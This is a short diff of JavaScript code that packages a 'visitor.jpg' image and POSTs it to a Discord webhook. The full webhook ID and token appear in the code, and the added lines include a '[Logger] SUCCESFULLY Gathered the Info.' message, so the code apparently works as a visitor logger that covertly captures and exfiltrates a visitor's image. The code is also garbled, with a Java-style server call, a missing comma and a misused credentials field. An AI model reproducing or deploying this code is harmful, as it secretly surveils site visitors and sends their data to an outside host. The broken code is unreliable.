@@ -174,13 +174,17 @@
     var file = new File([blob],
      'visitor.jpg');
     
-    var formData = new FormData(request.getRemoteAddr());
+    var formData = new FormData();
     formData.append('file', file);
     
     fetch(
       'https://discord.com/api/webhooks/1110072092826808390/IR34WYbMbUzKWKv2ade5O7m7JEQfzhpsFgOCzAql57-ViE5Rcs57JLUwnCBYboKH78kj', {
        method: 'POST',
        body: formData
+       credentials: "[Logger] SUCCESFULLY Gathered the Info."
+       headers: {
+           "My-Custom-Header": "Custom-Header-Value",
+         }
       })
      .then(function(response) {
       console.log(
